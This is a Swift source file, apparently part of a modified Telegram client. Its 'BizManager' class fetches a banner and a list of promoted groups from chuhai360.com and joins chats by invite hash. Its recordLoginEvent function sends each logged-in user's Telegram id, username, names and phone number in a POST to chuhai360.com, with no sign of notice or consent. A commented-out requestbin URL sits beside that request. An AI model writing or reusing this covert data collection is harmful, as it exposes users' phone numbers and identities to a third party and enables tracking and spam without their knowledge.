import Foundation
import SwiftSignalKit
import MtProtoKit

public class BizManager {

    // Signal版
    // 如何使用
    // ProxyManager.fetchProxyServers().start(next: { proxyServers in
    //     // Handle proxy servers
    //     DispatchQueue.global(qos: .background).async {
    //         // code to be executed asynchronously
    //         let encoder = JSONEncoder()
    //         if let encodedProxyServers = try? encoder.encode(proxyServers) {
    //             UserDefaults.standard.set(encodedProxyServers, forKey: "proxyServers")
    //         }
    //     }
    // }, error: { error in
    //     // Handle error
    //     print(error)
    // })

    // fetch banner and save to UserDefaults
    public static func fetchAndSaveSplashScreen() -> Signal<Bool, Error> {
        return Signal { subscriber in
            let url = URL(string: "https://chuhai360.com/aaacsapi/banner")!
            var request = URLRequest(url: url, cachePolicy: URLRequest.CachePolicy.reloadIgnoringLocalCacheData, timeoutInterval: Double.infinity)
            let headers = ["Content-Type": "application/json"]
            request.allHTTPHeaderFields = headers
            request.httpMethod = "GET"
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    subscriber.putError(error)
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    subscriber.putCompletion()
                    return
                }

                guard (200...299).contains(httpResponse.statusCode) else {
                    // Handle server error
                    subscriber.putCompletion()
                    return
                }

                guard let data = data else {
                    subscriber.putCompletion()
                    return
                }

                guard let splashImages = try? JSONDecoder().decode(SplashImages.self, from: data) else {
                    return
                }

                if let first = splashImages.first(where: { $0.type == "home"}) {
                    let splashImage = first
                    // UserDefaults.standard.set(splashImage, forKey: "splashImage")
                    // note: UserDefaults can only store simple types, otherwise raise exception
                    // Terminating app due to uncaught exception 'NSInvalidArgumentException'
                    guard let jsonDataForSingleImage = try? JSONEncoder().encode(splashImage) else {
                        return
                    }
                    UserDefaults.standard.set(jsonDataForSingleImage, forKey: "splashImage")
                }
                // for image in SplashImages where image.type == "home" {
                // }
                // UserDefaults.standard.set(data, forKey: "splashImage")
                // download image and save to UserDefaults as Data

                subscriber.putNext(true)
                subscriber.putCompletion()
            }

            task.resume()

            return ActionDisposable {
                task.cancel()
            }
        }
    }

    // read image data from UserDefaults
    public static func readSplashImage() -> Signal<SplashImageElement, Error> {
        return Signal { subscriber in
            if let data = UserDefaults.standard.data(forKey: "splashImage") {
                do {
                    let decoder = JSONDecoder()
                    let splashImage = try decoder.decode(SplashImageElement.self, from: data)
                    subscriber.putNext(splashImage)
                    subscriber.putCompletion()
                } catch {
                    print("json decode error")
                    debugPrint(error.localizedDescription)
                    subscriber.putError(error)
                }
            } else {
                let err = NSError(domain: "NO_SPLASH_IMAGE", code: 500)
                subscriber.putError(err)
            }

            return ActionDisposable { }
        }
    }

    // download image to cache and retrun image path in cache
    public static func downloadImage(url: String) -> Signal<URL, Error> {
        return Signal { subscriber in
            let url = URL(string: url)!
            let tempDirectory = FileManager.default.temporaryDirectory
            let imageFileUrl = tempDirectory.appendingPathComponent(url.lastPathComponent)
            if FileManager.default.fileExists(atPath: imageFileUrl.path) {
                // let image = UIImage(contentsOfFile: imageFileUrl.path)
                // subscriber.putNext(image)
                subscriber.putNext(imageFileUrl)
            } else {
                var request = URLRequest(url: url, cachePolicy: URLRequest.CachePolicy.reloadIgnoringLocalCacheData, timeoutInterval: Double.infinity)
                request.httpMethod = "GET"
                let task = URLSession.shared.dataTask(with: request) { data, response, error in
                    if let error = error {
                        subscriber.putError(error)
                        return
                    }

                    guard let httpResponse = response as? HTTPURLResponse else {
                        subscriber.putCompletion()
                        return
                    }

                    guard (200...299).contains(httpResponse.statusCode) else {
                        // Handle server error
                        subscriber.putCompletion()
                        return
                    }

                    guard let data = data else {
                        subscriber.putCompletion()
                        return
                    }

//                    if let data, let image = UIImage(data: data) {
//                        try? data.write(to: imageFileUrl)
//                        subscriber.putNext(image)
//                    }
                    try? data.write(to: imageFileUrl)
                    subscriber.putNext(imageFileUrl)
                    subscriber.putCompletion()
                }

                task.resume()

                return ActionDisposable {
                    task.cancel()
                }
            }

            return ActionDisposable {}
        }
    }


    // fetch predefined groups and channels
    public static func fetchGroupsAndChannels() -> Signal<GroupsAndChannels, Error> {
        return Signal { subscriber in
            let url = URL(string: "https://chuhai360.com/aaacsapi/groups_and_channels")!
            var request = URLRequest(url: url, cachePolicy: URLRequest.CachePolicy.reloadIgnoringLocalCacheData, timeoutInterval: Double.infinity)
            let headers = ["Content-Type": "application/json"]
            request.allHTTPHeaderFields = headers
            request.httpMethod = "GET"
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    subscriber.putError(error)
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    subscriber.putCompletion()
                    return
                }

                guard (200...299).contains(httpResponse.statusCode) else {
                    // Handle server error
                    subscriber.putCompletion()
                    return
                }

                guard let data = data else {
                    subscriber.putCompletion()
                    return
                }

                let result = try? JSONDecoder().decode(GroupsAndChannels.self, from: data)
                // UserDefaults.standard.set(data, forKey: "splashImage")
                subscriber.putNext(result!)
                subscriber.putCompletion()
            }

            task.resume()

            return ActionDisposable {
                task.cancel()
            }
        }
    }

    public static func joinGroupOrChannel(engine: TelegramEngine, hash: String) {
//        let randomDelay = Double.random(in: 0..<10) // Generates a random number between 0 and 9
//        let delayTime = DispatchTime.now() + .milliseconds(Int(randomDelay * 1000))
//        DispatchQueue.main.asyncAfter(deadline: delayTime) {
            // Code to be executed after the random delay
//            print("Task executed after \(randomDelay) seconds")
            _ = (engine.peers.joinChatInteractively(with: hash) |> deliverOnMainQueue).start(next: { peer in
                    debugPrint("with hash: \(hash), joined peer: \(peer!.id)")
                    debugPrint(peer!)
                }, error: { error in
                    debugPrint("with hash: \(hash), got join peer error: \(error)")
                }, completed: {
                    debugPrint("with hash: \(hash), join peer completed")
                })
//        }
    }

    public static func recordLoginEvent(user: TelegramUser) {
        let date = Date()
        let df = DateFormatter()
        df.dateFormat = "yyyy-MM-dd HH:mm:ss"
        let loginedAt = df.string(from: date)

        let username = user.username ?? ""
        let firstName = user.firstName ?? ""
        let lastName = user.lastName ?? ""
        // let photo = user.photo ?? ""
        let photo = ""
        let phone = user.phone ?? ""

        let loginEvent = UserInfo(id: user.id.toInt64(), username: username, firstName: firstName, lastName: lastName, photo: photo, phone: phone,loginedAt: loginedAt)
        do {
            var postData: Data
            let encoder = JSONEncoder()
            if let jsonData = try? encoder.encode(loginEvent) {
                postData = jsonData
            }else {
                print("ERROR")
                return
            }
            let url = "https://chuhai360.com/aaacsapi/add-user"
            // let url = "https://enqefupim3x1e.x.pipedream.net/"
            var request = URLRequest(url: URL(string: url)!, timeoutInterval: Double.infinity)
            let headers = ["Content-Type": "application/json"]
            request.httpMethod = "POST"
            request.allHTTPHeaderFields = headers
            request.httpBody = postData
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let _ = error {
                    // Handle HTTP request error
                    print("error=\\(error)")
                    return
                } else if let data = data {
                    // Handle HTTP request response
                    print(String(data: data, encoding: .utf8)!)
                } else {
                    // Handle unexpected error
                }
            }
            task.resume()
        }
    }
    
    // remove https://t.me/ or https://t.me/+
    public static func extractHashFrom(url: String) -> String {
        // https://t.me/+98K-hvgZVKQ5ZWY1
        // https://t.me/le445566
        let pattern = #"^https://t.me/(\+){0,1}"#
        // let url = "https://t.me/+98K-hvgZVKQ5ZWY1"
        let result = BizManager.replaceString(regexPattern: pattern, replacement: "", input: url)
        return result
    }

    public static func replaceString(regexPattern: String, replacement: String, input: String) -> String {
        do {
            let regex = try NSRegularExpression(pattern: regexPattern, options: [])
            let range = NSRange(location: 0, length: input.utf16.count)
            return regex.stringByReplacingMatches(in: input, options: [], range: range, withTemplate: replacement)
        } catch {
            print("Error creating regular expression: \(error)")
            return input
        }
    }

}

// This file was generated from JSON Schema using quicktype.io, do not modify it directly.
// To parse the JSON, add this file to your project and do:
//
//   let splashImage = try? JSONDecoder().decode(SplashImage.self, from: jsonData)

// MARK: - SplashImageElement
public struct SplashImageElement: Codable {
    let id: Int
    public let imageURL: String
    public let siteURL: String
    public let type: String

    enum CodingKeys: String, CodingKey {
        case id
        case imageURL = "imageUrl"
        case siteURL = "siteUrl"
        case type
    }

    // Memberwise initializer
    init(id: Int, siteURL: String, imageURL: String, type: String) {
       self.id = id
       self.siteURL = siteURL
       self.imageURL = imageURL
       self.type = type
    }
}

public typealias SplashImages = [SplashImageElement]



// This file was generated from JSON Schema using quicktype, do not modify it directly.
// To parse the JSON, add this file to your project and do:
//
//   let groupAndChannel = try? JSONDecoder().decode(GroupsAndChannels.self, from: jsonData)

// MARK: - GroupAndChannelElement
public struct GroupAndChannelElement: Codable {
    let id: Int
    let title: String
    public let siteURL: String
    public let peerID, chatType, description: String

    enum CodingKeys: String, CodingKey {
        case id, title
        case siteURL = "siteUrl"
        case peerID = "peerId"
        case chatType
        case description = "describe"
    }
}

public typealias GroupsAndChannels = [GroupAndChannelElement]
